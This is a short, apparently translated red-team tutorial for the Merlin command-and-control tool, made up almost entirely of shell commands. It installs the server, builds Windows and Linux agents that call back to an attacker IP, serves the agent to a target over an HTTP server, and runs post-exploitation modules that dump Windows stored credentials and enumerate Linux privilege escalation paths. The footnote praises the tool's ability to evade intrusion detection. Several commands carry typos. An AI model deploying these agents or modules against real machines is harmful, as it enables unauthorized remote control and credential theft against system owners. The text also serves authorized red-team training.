## Command and Control Guide to Merlin

### Introduction [^1]

### Installation

```bash
apt install golang
mkdir /opt/merlin;cd /opt/merlin
wget //github.com/Ne0nd0g/merlin/releases/download/v0.1.4/merlinServer-Linux-x64-v0.1.4.7z
7z x merlinServer-Linux-x64-v0.1.4.7z
# check if the server is running
./merlinServer-Linux-x64 
# setup GOPATH environment variable
echo "export GOPATH=$HOME/go" >> .bashrc
source .bashrc
go get github.com/Ne0nD0g/merlin
cd go/src/github.com/Ne0nd0g/merlin/cmd/merlinserver
go run main.go
# setup SSL certifacat
cp -r /opt/merlin/data /root/go/src/github.com/Ne0nd0g/merlin/cmd/merlinserver/
go run main.go -h
```

### Windows exploitation

```bash
# make Merlin agent for Windows
GOOS=windows GOARCH=amd64 go build -ldlags "-X main.url=//192.168.0.11:443" -o shell.exe main.go
# share the shell with the target using python server
python -m SimpleHTTPServer 80
# create a listener for the shell to revert
go run main.go -i 192.168.0.11
sessions
interact <sessions name>
info
back
use module * # various post exploitation modules
```

### Windows post exploitation

```bash
# dump the credentials of windows
use module windows/x64/powershell/credentials/dumpCredStore
info
set agent <agent name>
run
```

### Linux exploitation

```bash
Export GOOS=linux;export GOARCH=amd64; go build -ldflags "-s -w -X main.url=//192.168.0.11:443" -o shell.elf main.go
go run main.go -I 192.168.0.11
```

### Linux post exploitation

```bash
use module linux/x64/bash/priesc/LinEnum
set agent <agent name>
run
```

[原文](https://www.hackingarticles.in/command-and-control-guide-to-merlin/)

---

[^1]: Merlin是一个用Go语言编写的优秀的跨平台命令和控制工具。它由两个元素组成，即服务器和代理。它适用于HTTP / 2协议。关于Merlin的最好的事情是它被编译为可以在任何平台上运行，甚至可以从源代码构建它。通常，代理程序被放在Windows上并且正在Linux上进行监听，但是由于使用Go语言编写，Merlin允许我们将代理放在我们遇到的任何平台/机器上，我们也可以在任何平台上收听它。在涉及红色团队时，这比其他人更成功，因为它使IDS / IPS难以识别它。Merlin服务器将在代理可以调用它的文件夹中运行。默认情况下，服务器在127.0.0.1:443上配置，但您可以将其更改为您自己的IP。如前所述，merlin代理可以是交叉复杂的，可以在任何平台上运行。使用目标的路径变量执行任何二进制文件。